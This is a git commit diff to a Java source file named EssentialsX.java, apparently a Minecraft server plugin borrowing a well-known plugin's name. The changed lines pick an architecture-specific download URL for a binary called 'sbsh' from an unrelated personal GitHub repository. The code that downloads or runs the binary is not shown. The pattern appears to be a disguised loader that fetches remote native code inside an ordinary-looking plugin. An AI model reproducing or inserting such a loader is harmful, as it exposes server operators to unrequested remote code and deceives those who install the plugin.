c0e36268f2481460be8ea5907eccfdede504afe2
pingmike2 <166621491+pingmike2@users.noreply.github.com>
2026-02-17 13:28:08 +0800

    Add files via upload

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -40,11 +40,11 @@ public class EssentialsX extends JavaPlugin {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://github.com/pingmike2/test/releases/download/amd64";
+            url = "https://github.com/pingmike2/test/releases/download/amd64/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://github.com/pingmike2/test/releases/download/arm64";
+            url = "https://github.com/pingmike2/test/releases/download/arm64/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://github.com/pingmike2/test/releases/download/s390x";
+            url = "https://github.com/pingmike2/test/releases/download/s390x/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
